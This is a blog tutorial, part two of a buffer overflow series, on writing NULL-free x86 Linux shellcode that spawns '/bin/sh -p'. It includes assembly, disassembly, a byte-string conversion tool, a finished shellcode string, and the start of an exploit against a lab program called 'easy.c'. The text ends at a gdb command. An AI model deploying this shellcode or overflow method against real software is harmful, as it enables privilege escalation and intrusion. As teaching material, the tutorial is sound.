---
layout: post
title: Modern Buffer Overflows (Part II) - Shellcodes
author: Austin Howard
---

[Part I](../Modern-Buffer-Overflows) covered the reasons that buffer overflows exist in a system with little to no protections against them. That post covered all the nitty-gritty details up to actually crashing a process, and talked briefly about how this might theoretically be useful to an attacker. This post will examine shellcode, what it is, how to write it, and how to use it.

## What Is Shellcode? ##

At the very basics, shellcode is nothing more than binary compiled instructions that the target machine can execute. So what makes it special? Shellcodes are specifically designed to be run inside another executing process rather than being loaded and executed by the loader.

Shellcodes generally have the following properties:

 * Compiled Binary Code - It must be able to run on the target platform inside another process.
 * Small - Not a requirement, but most of the time shellcode needs to be small so that it will fit inside another program.
 * Does Not Contain Any NULL Bytes - Not a requirement, but many vulnerable functions will require this property.
 * Spawn a Shell - Not a requirement but most shellcodes spawn a privileged shell to give the attacker better control over the system. This is often easier than writing all the malicious instructions directly into the shellcode.

A lot of posts on shellcoding will suggest that the programmer start with a compiled C program and massage it until it fits the above criteria. On the other hand, there is a lot more to be learned by writing the shellcode from scratch in Assembly. This post will focus on the by-hand shellcoding approach, and there will be lots of Assembly (specifically AT&T syntax ASM written for 32/64-bit linux systems). If you are unfamiliar with Assembly and/or just need a reference manual while reading this post I highly recommend looking through [the x86 Assembly wikibook](https://en.wikibooks.org/wiki/X86_Assembly) (on that site AT&T syntax is synonymous with GAS syntax).

## Starting Point ##

Rather than starting with a compiled C program and deconstructing it, this post will start with a regular Assembly program that can be compiled, linked, and executed to spawn a shell. This will give a good starting point which can be manipulated into a fully functional shellcode meeting all of the criteria set forth in the first section.

A system call is simply a function call to the kernel. Programs that are not written to be part of the operating system generally use library functions that are wrappers around system calls to talk to the operating system kernel. The system calls are responsible for things like memory management, input/output operations, spawning processes, and all other operations that the operating system is responsible for. Think of system calls as a direct line for talking to the operating system.

The last post mentioned that the C ABI lays out the calling convention for functions as pushing all the parameters onto the stack in reverse order. The kernel does not care what is on the program's stack or stack frame, but there needs to be a mechanism for passing parameters to the system calls. For this, x86 systems use registers in a specific order: `%ebx %ecx %edx %esi %edi` for 32-bit and `%rdi %rsi %rdx %r10 %r8 %r9` for 64-bit. The accumulator register (`%eax` / `%rax`) is set aside for denoting which system call is being called, and is also used as the return value from the system call.

*Throughout this paper you may want to have a look at the system calls that are available or figure out how they work. For this I highly recommend [this page for 32-bit x86](http://asm.sourceforge.net/syscall.html) and [this page for 64-bit x86](http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64). Though the system call numbers are different, the arguments are largely the same.*

This section will examine the `execve` system call which spawns a process and waits for it to exit. The C function prototype to this function is `int execve(cont char * filename, cont char * argv[], const char * envp[])`. The first argument is the filename or path to the executable file to invoke, followed by a list of arguments and finally the environment variables. The prototype for the system call is exactly the same. Below is an example of how to use this system call in x86 32-bit Assembly.

```
##
#  shell1_32.s - Executes a shell by calling execve
#  Compile and Link:
#        gcc -m32 -c shell1_32.s
#        ld -o shell1_32 -melf_i386 shell1_32.o

# Starts the data section, this is where the program stores initialized
# variables, and it is in a separate memory space than the .text section
.data

# This is the location of the program we intend to execute
shell_name:
    .asciz "/bin/sh"

# This is an argument we intend to pass to /bin/sh
shell_arg:
    .asciz "-p"

# This starts the .text section of the code, or the code section
.text
.global _start

_start:
    # function prolog
    push %ebp
    mov %esp, %ebp

    # places a NULL pointer on the stack
    xor %edi, %edi
    push %edi

    # place a pointer to "/bin/sh" on the stack
    mov $shell_arg, %edi
    push %edi

    # place a pointer to the argument "-p" on the stack
    mov $shell_name, %edi
    push %edi

    # move the pointer to "/bin/sh" into %ebx (the first argument to execve)
    mov %edi, %ebx
    # move a pointer to the argv list into %ecx
    mov %esp, %ecx
    # make the envp pointer NULL
    xor %edx, %edx

    # place 11 (execve systemcall number) into %eax
    xor %eax, %eax
    mov $0xb, %eax

    # make the system call
    int $0x80

    # function epilog
    pop %ebp
    ret
```

Compiling, linking, and executing this program reveals that it indeed does call `execve("/bin/sh", ["/bin/sh", "-p"], NULL)`. This program gives a good starting point to build a working shellcode from as it executes a shell (`/bin/sh`). More importantly, it executes a shell which has the potential to grant the attacker a privileged shell. The `-p` argument that was supplied to `execve` as the second string in the `argv` array turns on privileged mode for the new process in the Bourne Again Shell (bash). 

From the bash manual page:
> -p      Turn on privileged mode.  In this mode, the $ENV and $BASH_ENV files are not processed, shell functions are not inherited from the environment, and the  SHELLOPTS,  BASHOPTS,  CDPATH,
>         and GLOBIGNORE variables, if they appear in the environment, are ignored.  If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p
>         option is not supplied, these actions are taken and the effective user id is set to the real user id.  If the -p option is supplied at startup, the effective user  id  is  not  reset.
>         Turning this option off causes the effective user and group ids to be set to the real user and group ids.

In Linux, a program has a bitmask which is used to specify whether the current user or group has permissions to read, write, or execute any file on the filesystem. Additionally, there are two extra bits that specify when the program is run that it should execute with the privileges of the owner of the file (suid bit), or privileges of the owning group of the file (sgid bit). The entry from the manual page of bash, quoted above, specifies that when bash is executed it should respect the values set in the suid and sgid bits.

There are some comments in the code about the `.data` and `.text` sections. There are several different sections of any compiled executable that tell the loader which pieces of code need to have certain permissions and which need to be available where. This code uses the `.data` section to create two global variables which are then used in the `.text` section. The data section is specifically for global initialized variables, and the loader will place these variables in a section of memory separate from your code. The text section, on the other hand, is specifically for executable code portions of the program. One of the reasons for the distinction is that different parts of your program will require different permissions to carry out their duties. For example, there is no reason that the code section would need to be writeable, so it is ok to turn off the write permission on executable sections of memory. There are some sections of memory in a program that require only read and write permissions, so there is no reason to have execute permission on them. This separation of sections in a program helps the loader determine which sections need which permissions, but it also helps the loader determine where each section should be mapped. For example, the stack which grows toward lower memory addresses should not be mapped at address 0x0.

The two variables in the shellcode are declared in the same manner as the `_start` function. These labels are only useful to the compiler such that it can correlate the name `shell_name` to a particular location later in the text section. Additionally both are declared with the `.asciz` compiler directive, which instructs the compiler that the following data is a NULL terminated string. This is important because C strings are NULL terminated, and the function or system call that receives a C string knows that the string has ended when it reaches a NULL character. This concept will be important later when eliminating all the NULL bytes from the shellcode.

The `_start` function begins by loading pointers to the two variables and arranges them on the stack in the order they will be needed. Before the two pointers are pushed to the stack the `%edi` register is zeroed and pushed onto the stack. This effectively pushes 4 NULL bytes onto the stack above the two pointers to the strings. In C, arrays function much the same as C strings in that they are terminated by a NULL entry. Recalling that system calls accept their arguments through registers instead of on the stack, some carefully crafted pointers are copied to the appropriate registers before calling system call number 11.

The implementation of `char * argv[]` in C is essentially an array of pointers, and those pointers point to an array of characters. Each character array is terminated by a single NULL byte, and the array of pointers is terminated by a NULL pointer. In the program above, the labels `shell_name` and `shell_arg` are equivalent to pointers to an array of characters. For this reason, the addresses contained in the labels are pushed onto the stack, and a pointer to the stack location where they are pushed is used as the `char * argv[]` passed to `execve`.

The last line of the code `int $0x80` informs the operating system that there is a message waiting. Specifically, it means the userland program is attempting to make a system call. At this point, execution of the program will be suspended until the kernel is finished fulfilling (or denying) the system call request. In this case `%eax` holds the value 11 which corresponds to the `execve` system call and the kernel will use the values in `%ebx`, `%ecx`, and `%edx` to attempt to fulfill that request. When the system call finishes execution the program will resume execution where it left off; however, since bash calls the `exit` system function when it is done the entire process will be cleaned up and exit before returning to the Assembly program.

The 64-bit version of this program is very similar with the exception that the register names are different and the system call instruction is different:

```
##
#  shell1_64.s - Executes a shell by calling execve
#  Compile and Link:
#        gcc -c shell1_64.s
#        ld -o shell1_64 shell1_64.o

# Starts the data section, this is where the program stores initialized
# variables, and it is in a separate memory space than the .text section
.data

# This is the location of the program we intend to execute
shell_name:
    .asciz "/bin/sh"

# This is an argument we intend to pass to /bin/sh
shell_arg:
    .asciz "-p"

# This starts the .text section of the code, or the code section
.text
.global _start

_start:
    # function prolog
    push %rbp
    mov %rsp, %rbp

    # place a NULL pointer on the stack
    xor %r8, %r8
    push %r8

    # place a pointer to "-p" on the stack
    mov $shell_arg, %r8
    push %r8

    # place a pointer to "/bin/sh" on the stack
    mov $shell_name, %r8
    push %r8

    # move the pointer to "/bin/sh" to %rdi (first argument to execve)
    mov %r8, %rdi
    # move a pointer to the argv array to %rsi
    mov %rsp, %rsi
    # make the pointer to envp a NULL pointer
    xor %rdx, %rdx

    # set the system call number to 59
    xor %rax, %rax
    mov $0x3b, %rax

    # make the system call
    syscall

    # function epilog
    pop %rbp
    ret
```

On 64-bit Linux the `execve` system call number is 59. Additionally, the 64-bit x86 assembly uses the keyword `syscall` to notify the kernel that the userland program needs some work done.

This program contains the first and last of the properties of shellcode outlined in the first section: it is executable compiled code and it spawns a shell. The definitions of the two variables in the program indicate that the code contains NULL bytes (remember C strings and `.asciz` strings are NULL terminated). This is important because many of the unsafe functions that can lead to buffer overflows (e.g. `strcpy`) accept NULL terminated C strings as parameters and happily copy from the input string to the output pointer until reaching a NULL byte. In order to have the program under attack execute the shellcode, it needs to be copied to some predetermined location inside the vulnerable program. Therefore, if the function that allows writing to a predetermined location expects a C string that is NULL terminated, the function would stop writing the code as soon as it encounters a NULL byte.


## Removing NULL Bytes ##

This section relies heavily on the GNU tool objdump, which takes a compiled binary file and outputs various information contained within it. In this case, it is used heavily to examine the disassembly of the Assembly code. This will aid in finding the sections of the code that need to change in order to remove the NULL bytes.

```
[howard@sterling shellcodes]$ gcc -c shell1_32.s -m32 -o obj/shell1_32.o
[howard@sterling shellcodes]$ ld -melf_i386 -o bin/shell1_32 obj/shell1_32.o
[howard@sterling shellcodes]$ objdump -Dz bin/shell1_32

bin/shell1_32:     file format elf32-i386


Disassembly of section .text:

08048074 <_start>:
 8048074:	55                   	push   %ebp
 8048075:	89 e5                	mov    %esp,%ebp
 8048077:	31 ff                	xor    %edi,%edi
 8048079:	57                   	push   %edi
 804807a:	bf 9f 90 04 08       	mov    $0x804909f,%edi
 804807f:	57                   	push   %edi
 8048080:	bf 97 90 04 08       	mov    $0x8049097,%edi
 8048085:	57                   	push   %edi
 8048086:	89 fb                	mov    %edi,%ebx
 8048088:	89 e1                	mov    %esp,%ecx
 804808a:	31 d2                	xor    %edx,%edx
 804808c:	31 c0                	xor    %eax,%eax
 804808e:	b8 0b 00 00 00       	mov    $0xb,%eax
 8048093:	cd 80                	int    $0x80
 8048095:	5d                   	pop    %ebp
 8048096:	c3                   	ret    

Disassembly of section .data:

08049097 <shell_name>:
 8049097:	2f                   	das    
 8049098:	62 69 6e             	bound  %ebp,0x6e(%ecx)
 804909b:	2f                   	das    
 804909c:	73 68                	jae    8049106 <_end+0x62>
 804909e:	00                   	.byte 0x0

0804909f <shell_arg>:
 804909f:	2d                   	.byte 0x2d
 80490a0:	70 00                	jo     80490a2 <__bss_start>
```

The first command compiles the source code into an object file, and the second links it into an executable file. Specifically, the linker creates an Executable and Linkable Format executable or ELF binary. ELF is the default executable format on Unix like systems. The linker also fills in the locations of the two variables and puts the absolute addresses to them in the move instructions preceding the instructions that push them onto the stack.

objdump confirms that the executable is a 32-bit ELF executable and then provides a dump of the `.text` section. This code looks mostly ok, except the two variables have terminating NULL bytes. Additionally, the locations of the two variables are absolute (rather than relative) addresses which would be much harder to re-calculate when injecting the code into a running process. The addressing of these variables is important because, when the addresses are absolute, the addresses must be changed for each program the shellcode is used with. This means that the addresses will need to be calculated relative to the beginning address of the shellcode, and the existing move instructions modified to point to the new absolute addresses. It would be nice if the code was portable enough that it didn't need to be recompiled for every vulnerable program that it gets injected into.

The next part of the output shows the `.data` section of the code, which contains the variables. The instruction set output of this looks funny because objdump attempts to interpret the raw bytes as x86 assembly instructions. However, looking at the hex dump of the `.data` section and reinterpreting the hex characters as ASCII characters yields the values "/bin/sh\0" and "-p\0", the two NULL terminated argument strings.

The variables can be moved out of the data section by directly pushing the values of the strings onto the stack. This will remove the need for the absolute addresses and recompilation when inserting into a vulnerable program. The move instructions which push the literal values for the system calls will also need to be reworked to remove the extra NULL bytes. X86 Assembly helps in this task by providing a way of addressing the registers as 1, 2, or 4 bytes in 32-bit mode, and 1, 2, 4, or 8 bytes in 64-bit mode. The following code takes advantage of these techniques.

```
##
#  shell2_32.s - Executes "/bin/sh"
#    Compile and Link:
#        gcc -c shell2_32.s -m32
#        ld -o shell2_32 -melf_i386 shell2_32.o
.text
.global _start

_start:
    push %ebp
    mov %esp, %ebp

    # zero %edi
    xor %edi, %edi

    # push "-p\0" onto the stack
    mov $0x702d, %di
    push %edi
    # save location of "-p\0" into %esi
    mov %esp, %esi

    # mov "/shA" into %edi
    mov $0x4168732f, %edi
    # shift %edi left 8 bits, and then back right 8 bits
    # this zeros the "A" on the end of "/shA"
    shl $0x08, %edi
    shr $0x08, %edi
    # push "/sh\0" on to the stack
    push %edi
    
    # push "/bin" on the stack
    mov $0x6e69622f, %edi
    push %edi
    
    # save the address of "/bin/sh\0" into %ebx
    mov %esp, %ebx

    # push a null entry on the stack
    xor %edi, %edi
    push %edi
    # push a pointer to "-p\0" on the stack
    push %esi
    # push a pointer to "/bin/sh\0" on the stack
    push %ebx

    # set pointers to argv and envp
    mov %esp, %ecx
    xor %edx, %edx

    # call execve(char * program, char * argv[], char * envp[])
    xor %eax, %eax
    mov $0xb, %al

    int $0x80

    # we pushed 6*4 bytes of data onto the stack, so remove it
    add $0x18, %esp
    pop %ebp
    ret
```

In this example the values of `/bin/sh` and `-p` are hard-coded as ASCII values into the program source and directly pushed onto the stack. As the values are pushed onto the stack, the value of the stack pointer is saved in a register for later use. This is because the stack pointer is pointing directly to the strings on the stack that will be needed later for the system call.

The register `%edi` is zeroed before moving the ASCII value for `-p` into the lower two bytes of the register (addressed by using `%di`). This ensures that the two most significant bytes of `%edi` are zero and the 2 least significant bytes hold the value `-p`, which results in a NULL terminated string. The same process is repeated for the string `/bin/sh`; however, since it is 7 bytes long and a single register is 4 bytes long it must be pushed onto the stack in two move operations. The second move operation poses a problem because there is no way to address only the 3 least significant bytes of a register. This is overcome by placing an extra non-NULL byte in the register and using bit shifting to zero the byte.

All that solves the problem of where to store the data (on the stack) and how to get rid of the NULL bytes in the compiled code caused from having NULL terminated strings. By addressing the least significant bytes of the registers, this code removed the NULL bytes introduced when moving a single byte system call number into a four byte register. A quick look at the objdump output will confirm that this code no longer contains NULL bytes:

```
[howard@sterling shellcodes]$ gcc -c shell2_32.s -o obj/shell2_32.o -m32
[howard@sterling shellcodes]$ objdump -Dz obj/shell2_32.o 

obj/shell2_32.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_start>:
   0:    55                       push   %ebp
   1:    89 e5                    mov    %esp,%ebp
   3:    31 ff                    xor    %edi,%edi
   5:    66 bf 2d 70              mov    $0x702d,%di
   9:    57                       push   %edi
   a:    89 e6                    mov    %esp,%esi
   c:    bf 2f 73 68 41           mov    $0x4168732f,%edi
  11:    c1 e7 08                 shl    $0x8,%edi
  14:    c1 ef 08                 shr    $0x8,%edi
  17:    57                       push   %edi
  18:    bf 2f 62 69 6e           mov    $0x6e69622f,%edi
  1d:    57                       push   %edi
  1e:    89 e3                    mov    %esp,%ebx
  20:    31 ff                    xor    %edi,%edi
  22:    57                       push   %edi
  23:    56                       push   %esi
  24:    53                       push   %ebx
  25:    89 e1                    mov    %esp,%ecx
  27:    31 d2                    xor    %edx,%edx
  29:    31 c0                    xor    %eax,%eax
  2b:    b0 0b                    mov    $0xb,%al
  2d:    cd 80                    int    $0x80
  2f:    83 c4 18                 add    $0x18,%esp
  32:    5d                       pop    %ebp
  33:    c3                       ret 
```

Indeed, there are no more NULL bytes, and there is no absolute addressing going on, which suggests that this code is perfectly valid shellcode. The 64-bit version of this code has the nice quality that each of the arguments can be moved into a single register, removing the need to push one extra time when inserting `/bin/sh`:

```
##
#  shell2_64.s - Executes "/bin/sh"
#    Compile and Link:
#        gcc -c shell2_64.s
#        ld -o shell2_64 shell2_64.o
.text
.global _start

_start:
    push %rbp
    mov %rsp, %rbp

    xor %r8, %r8

    # push "-p" onto the stack
    mov $0x702d, %r8w
    push %r8
    # save location of "-p" into %r9
    mov %rsp, %r9

    # mov "/bin/shA" into %r8
    mov $0x4168732f6e69622f, %r8
    # shift %r8 left 8 bits, and then back right 8 bits
    # this zeros the "A" on the end of "/bin/shA"
    shl $0x8, %r8
    shr $0x8, %r8
    # push "/bin/sh" on the stack
    push %r8
    # save the address of "/bin/sh" into %rdi
    mov %rsp, %rdi

    # push a null entry on the stack
    xor %r8, %r8
    push %r8
    # push a pointer to "-p" on the stack
    push %r9
    # push a pointer to "/bin/sh" on the stack
    push %rdi

    # set pointers to argv and envp
    mov %rsp, %rsi
    xor %rdx, %rdx

    # call execve(char * program, char * argv[], char * envp[])
    xor %rax, %rax
    mov $0x3b, %al

    syscall

    # we pushed 5*8 bytes of data onto the stack, so remove it
    add $0x28, %rsp
    pop %rbp
    ret
```

The only real difference is that more data can be moved into a single register in the 64-bit version allowing more work to be done in fewer instructions. A quick look at the objdump output also confirms this code meets the criteria for shellcode:

```
[howard@sterling shellcodes]$ objdump -Dz obj/shell2_64.o 

obj/shell2_64.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:    55                       push   %rbp
   1:    48 89 e5                 mov    %rsp,%rbp
   4:    4d 31 c0                 xor    %r8,%r8
   7:    66 41 b8 2d 70           mov    $0x702d,%r8w
   c:    41 50                    push   %r8
   e:    49 89 e1                 mov    %rsp,%r9
  11:    49 b8 2f 62 69 6e 2f     movabs $0x4168732f6e69622f,%r8
  18:    73 68 41 
  1b:    49 c1 e0 08              shl    $0x8,%r8
  1f:    49 c1 e8 08              shr    $0x8,%r8
  23:    41 50                    push   %r8
  25:    48 89 e7                 mov    %rsp,%rdi
  28:    4d 31 c0                 xor    %r8,%r8
  2b:    41 50                    push   %r8
  2d:    41 51                    push   %r9
  2f:    57                       push   %rdi
  30:    48 89 e6                 mov    %rsp,%rsi
  33:    48 31 d2                 xor    %rdx,%rdx
  36:    48 31 c0                 xor    %rax,%rax
  39:    b0 3b                    mov    $0x3b,%al
  3b:    0f 05                    syscall 
  3d:    48 83 c4 28              add    $0x28,%rsp
  41:    5d                       pop    %rbp
  42:    c3                       retq
```

This shellcode is easy to verify by simply linking it with ld and executing it. This code may execute a new shell and be valid shellcode, but it is terribly painful to type out every ASCII character in hex. The next section looks at a much cleaner approach to shellcoding.


## Clean (shell)code ##

More often than not shellcode lives on the stack because the code needs to be passed in to the program after it starts and all local variables are stored on the stack. With the assumption that the shellcode lives on the stack and that the stack is executable (use the `-z execstack` argument when compiling), the stack will be mapped to memory with the read, write, and execute permissions. This is important for using the techniques from the last section to create NULL bytes in the code during execution.

Recalling from the section "Starting Point," variables were labeled the same as executable functions (e.g. `function_or_variable_name:`) and are compiled out before linking. Given that, it should be possible to put raw data in the text section of the compiled output; however, the strings cannot be defined with `.asciz` because of the terminating NULL byte. There is another string literal, `.ascii`, compiler directive which denotes a literal text string with no terminating NULL byte.

The last problem to solve will be addressing those variables in a position independent way.The linker made some assumptions about where the labels would live in memory when linking "shell1_32.s." Luckily, most of the control flow operations in Assembly are based on instruction pointer relative addresses. Recalling from the last post that `call label` is equivalent to `push %eip; jmp label` and that the instruction pointer always points to the next instruction to execute, one can get the address of data using a `call` instruction. The below code does just that:

```
##
#  shell3_32.s - Executes "/bin/sh"
#     Compile and Link:
#        gcc -c shell3_32.s -m32
#        ld -o shell3_32 -melf_i386 shell3_32.o
.global _start
.text

_start:
    # push a NULL byte
    xor %edi, %edi
    push %edi
    # unconditionally jump to shell_arg
    jmp shell_arg


system_call:
    # Move a pointer to "/bin/shA" into %edi
    mov (%esp), %edi

    # Move a single "A" into the least significant byte of %edx
    xor %edx, %edx
    mov $0x41, %dl

    # Remove the "A" from "/bin/shA" by xor'ing it with %edx
    xor %dl, 0x7(%edi)
    # Remove the "A" from "-pA" by xor'ing it with %edx
    mov 0x4(%esp), %edi
    xor %dl, 0x2(%edi)

    # move a pointer to "/bin/sh\0" into %ebx
    mov (%esp), %ebx
    # move a pointer to argv into %ecx
    mov %esp, %ecx
    # make %edx (envp) NULL
    xor %edx, %edx

    xor %eax, %eax
    mov $0xb, %al

    int $0x80
    

shell:
    # push a pointer to "/bin/shA" and jmp to system_call
    call system_call
    .ascii "/bin/shA"

shell_arg:
    # push a pointer to "-pA" and jump to shell
    call shell
    .ascii "-pA"
```

This code starts by constructing the argv array that will be passed to execve later. It pushes a NULL entry to end the array onto the stack then unconditionally jumps to the `shell_arg` function at the end of the file. The `call` instruction is used to push pointers to the "A" terminated strings onto the stack. The `call` instruction uses instruction pointer relative addresses and always uses 4 byte addresses (8 for 64-bit). To ensure there are no NULL bytes in the code, all uses of the `call` instruction need to call functions that are above the calling function. This makes the address to the called function a negative number relative to the instruction pointer. The addresses used by the `call` instruction are signed integers stored as twos-compliment, therefore a negative number is comprised of the positive number with all the bits flipped and one added. Using a negative relative `call` to functions ensures that all bytes of the address being jumped to have at least one bit set which removes any NULL bytes from the `call` instructions.

By the time the code reaches the `system_call` function, the stack has been setup with an array of character pointers that point to the "A" terminated strings. This code exploits the fact that it will live on the stack and that the stack has read, write, and execute permissions. In order to make the strings NULL terminated, it modifies them in place by xor'ing the terminating "A" with an "A" which sets all the bits to zero. The rest of the code is pretty straight forward; it simply sets all the correct registers for making the system call to `execve`. 

The 64 bit version of this code is nearly the same:

```
##
#  shell3_64.s - Executes "/bin/sh"
#     Compile and Link:
#        gcc -c shell3_64.s
#        ld -o shell3_64 shell3_64.o
.global _start
.text

_start:
    xor %rdi, %rdi
    push %rdi
    jmp shell_arg


system_call:
    mov (%rsp), %r8

    xor %r9, %r9
    mov $0x41, %r9b

    xor %r9b, 0x7(%r8)
    mov %r8, %rdi

    mov 0x8(%rsp), %r8
    xor %r9, 0x2(%r8)
    mov %rsp, %rsi

    xor %rdx, %rdx

    xor %rax, %rax
    mov $0x3b, %al

    syscall

shell:
    call system_call
    .ascii "/bin/shA"

shell_arg:
    call shell
    .ascii "-pA"
```

The code for "shell1" and "shell2" could be easily tested by compiling, linking, and executing the result to see that the code will execute a new shell. The same cannot be said about "shell3." Attempting to execute the output from the linker for "shell3" will fail to run. The program can be run in gdb to figure out why it is failing:

```
[howard@sterling shellcodes]$ gdb -q bin/shell3_64 
Reading symbols from bin/shell3_64...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/howard/repos/bof/shellcodes/bin/shell3_64 

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400088 in system_call ()
(gdb) disas system_call
Dump of assembler code for function system_call:
   0x000000000040007e <+0>:    mov    (%rsp),%r8
   0x0000000000400082 <+4>:    xor    %r9,%r9
   0x0000000000400085 <+7>:    mov    $0x41,%r9b
=> 0x0000000000400088 <+10>:    xor    %r9b,0x7(%r8)
   0x000000000040008c <+14>:    mov    %r8,%rdi
   0x000000000040008f <+17>:    mov    0x8(%rsp),%r8
   0x0000000000400094 <+22>:    xor    %r9,0x2(%r8)
   0x0000000000400098 <+26>:    mov    %rsp,%rsi
   0x000000000040009b <+29>:    xor    %rdx,%rdx
   0x000000000040009e <+32>:    xor    %rax,%rax
   0x00000000004000a1 <+35>:    mov    $0x3b,%al
   0x00000000004000a3 <+37>:    syscall 
End of assembler dump.
```

The program threw a segmentation fault attempting to zero the "A" from the string "/bin/shA". This can be explained by taking a look at how the loader has mapped the program into memory which can be done by finding the process ID of the program that is still running inside gdb and looking at its memory mapping in the "/proc" filesystem.

```
[howard@sterling bin]$ ps aux | grep shell3
howard    2799  0.0  0.8  74464 25656 pts/2    S+   09:10   0:00 gdb -q bin/shell3_64
howard    2801  0.0  0.0    160    16 pts/2    t    09:10   0:00 /home/howard/repos/bof/shellcodes/bin/shell3_64
howard    2806  0.0  0.0  11052  2168 pts/1    S+   09:12   0:00 grep shell3
[howard@sterling bin]$ cat /proc/2801/maps
00400000-00401000 r-xp 00000000 08:02 1443291                            /home/howard/repos/bof/shellcodes/bin/shell3_64
7ffff7ffa000-7ffff7ffd000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffd000-7ffff7fff000 r-xp 00000000 00:00 0                          [vdso]
7ffffffde000-7ffffffff000 rwxp 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

The first line of the maps file shows that the memory addresses 0x400000 to 0x401000 are mapped to the `shell3_64` executable. Further ,it shows that this memory space is mapped with read and execute permissions, but it is not mapped with the write permission. Examining the memory in gdb will yield the address that was being written to (`0x7(%r8)`):

```
(gdb) x/xb $r8+7
0x4000b1 <shell+12>:    0x41
```

This confirms that the address being written is 0x4000b1, which falls inside the memory space mapped to the executable for reading and executing. The segmentation fault is thrown because the process attempted to use a memory location in an incompatible way. Given that an executable is compiled with an executable stack, this shellcode will execute as expected.

## Using the Shellcode ##

At this point all NULL bytes have been removed from the shellcode, so how is this used to exploit the vulnerability in the "easy.c" program? In the first post, the buffer was filled with too much data, overwriting the instruction pointer and forcing the program to crash by making it jump to the address 0x42424242 (which is just 4 "B"s). Having control of the instruction pointer allows an attacker to make the program jump to any location that contains any instructions they desire.

The shellcode can be pushed onto the stack by passing it as a string through `argv[1]` into the buffer that will be filled with "A"s to overwrite `%eip`. This placement for the shellcode allows for an easy calculation of the buffer's address when debugging with gdb and, therefore, an easy calculation of the beginning of the shellcode. To get the shellcode into a string suitable for passing to the program through the arguments list, it will need to be converted to a string of bytes representing the compiled bytes. I have written a few utility scripts to aid in this process shown below:

```
[howard@sterling shellcodes]$ cat ../tools/otosc.py 
#!/usr/bin/python

##
#  Takes as input the ouput from:
#  objdump -Dz | grep "[0-9a-f]*?:" | cut -f 1,2
import sys

def main(inputs, outputfile):
    lines = [x.strip(" ") for x in inputs.split("\n")]
    barray = b""

    for line in lines:
        line = line.replace("\t", " ")
        datas = [x.strip(" :") for x in line.split(" ")]

        index = int(datas[0], 16)
        barray = barray[:index] + bytes([int(x, 16) for x in datas[1:]])

    with open(outputfile, "w") as fd:
        for byte in barray:
            fd.write("\\x{0}".format(hex(byte)[2:].zfill(2)))
        fd.write("\n")

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print ("Usage: {0} inputstring outputfile".format(sys.argv[0]))
        exit()
    main(sys.argv[1], sys.argv[2])
[howard@sterling shellcodes]$ cat ../tools/otosc.sh
pathtofile=$(dirname "$0")

${pathtofile}/otosc.py "$(objdump -Dz $1 | grep "[0-9a-f]:" | cut -f 1,2)" $2
[howard@sterling shellcodes]$ ../tools/otosc.sh obj/shell3_32.o shell3_32.sc
[howard@sterling shellcodes]$ cat shell3_32.sc
\x31\xff\x57\xeb\x2b\x8b\x3c\x24\x31\xd2\xb2\x41\x30\x57\x07\x8b\x7c\x24\x04\x30\x57\x02\x8b\x1c\x24\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\xe8\xee\xff\xff\xff\x2d\x70\x41
```

The format of the output is an escaped string of bytes, which is perfect for passing to `perl -e 'print "byte code string here"'`, as the `-e` flag will turn the escaped string back into bytes. The `wc` tool can be used to figure out the length of the shellcode to correctly calculate the amount of data needed to fill the buffer and overwrite `%ebp`.

```
[howard@sterling shellcodes]$ cat shell3_32.sc | wc -c
225
[howard@sterling shellcodes]$ python -c "print(hex(int(224 / 4)))"
0x38
```

The first line counts the number of bytes in the file "shell3_32.sc," including a newline at the end. The file contains four bytes "\xYY" for every one byte of code, so to get the full length subtract one and divide by four which yields (0x38 = 56 bytes). The final steps will be figuring out how much data is needed to fill the buffer and what address will hold the beginning of the shellcode.

```
[howard@sterling shellcodes]$ gdb -q ../easy32 
Reading symbols from ../easy32...done.
(gdb) disas vulnerable
Dump of assembler code for function vulnerable:
   0x0804844b <+0>:    push   %ebp
   0x0804844c <+1>:    mov    %esp,%ebp
   0x0804844e <+3>:    sub    $0x408,%esp
   0x08048454 <+9>:    sub    $0x8,%esp
   0x08048457 <+12>:    pushl  0x8(%ebp)
   0x0804845a <+15>:    lea    -0x408(%ebp),%eax
   0x08048460 <+21>:    push   %eax
   0x08048461 <+22>:    call   0x8048310 <strcpy@plt>
   0x08048466 <+27>:    add    $0x10,%esp
   0x08048469 <+30>:    sub    $0x8,%esp
   0x0804846c <+33>:    lea    -0x408(%ebp),%eax
   0x08048472 <+39>:    push   %eax
   0x08048473 <+40>:    push   $0x8048550
   0x08048478 <+45>:    call   0x8048300 <printf@plt>
   0x0804847d <+50>:    add    $0x10,%esp
   0x08048480 <+53>:    nop
   0x08048481 <+54>:    leave  
   0x08048482 <+55>:    ret    
End of assembler dump.
(gdb)
```

Just before the call to `strcpy`, the program loads the address of the buffer "%ebp - 0x408". This means that filling the buffer requires 0x408 bytes; add 4 bytes to overwrite `%ebp`, and add 4 more bytes to overwrite the return address. In this case the return address will be overwritten with the address to the beginning of the buffer, and the beginning of the buffer will hold the shellcode. The debugger can be used at this point to figure out the exact location of the return address.

```
(gdb) r `perl -e 'print "A"x0x40c, "B"x0x4'`
Starting program: /home/howard/repos/bof/easy32 `perl -e 'print "A"x0x40c, "B"x0x4'`
